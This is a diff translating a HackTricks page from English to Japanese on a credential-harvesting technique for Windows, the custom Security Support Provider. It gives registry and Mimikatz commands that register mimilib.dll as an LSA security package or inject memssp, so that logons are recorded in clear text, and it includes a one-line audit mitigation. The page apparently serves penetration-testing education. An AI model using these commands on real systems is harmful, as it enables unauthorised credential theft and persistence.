@@ -1,47 +1,40 @@
-# Custom SSP
+# カスタム SSP
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### Custom SSP
+### カスタム SSP
 
-[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
-You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.
+[SSP (セキュリティサポートプロバイダー) についてはこちらで学んでください。](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
+自分の**SSP**を作成して、**クリアテキスト**で**資格情報**を**キャプチャ**することができます。
 
 #### Mimilib
 
-You can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials in clear text.**\
-Drop the dll in `C:\Windows\System32\`\
-Get a list existing LSA Security Packages:
-
+Mimikatzによって提供される`mimilib.dll`バイナリを使用できます。**これにより、すべての資格情報がクリアテキストでファイルにログされます。**\
+dllを`C:\Windows\System32\`に配置します。\
+既存のLSAセキュリティパッケージのリストを取得します：
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
-    Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
+Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-
-Add `mimilib.dll` to the Security Support Provider list (Security Packages):
-
+`mimilib.dll`をセキュリティサポートプロバイダーリスト（セキュリティパッケージ）に追加します：
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
+再起動後、すべての資格情報は `C:\Windows\System32\kiwissp.log` に平文で見つけることができます。
 
-And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`
+#### メモリ内
 
-#### In memory
-
-You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
-
+Mimikatzを使用して、これをメモリ内に直接注入することもできます（少し不安定で動作しない可能性があることに注意してください）：
 ```powershell
 privilege::debug
 misc::memssp
 ```
+これは再起動に耐えません。
 
-This won't survive reboots.
+#### 緩和策
 
-#### Mitigation
-
-Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
+イベントID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` の監査作成/変更
 
 {{#include ../../banners/hacktricks-training.md}}
-
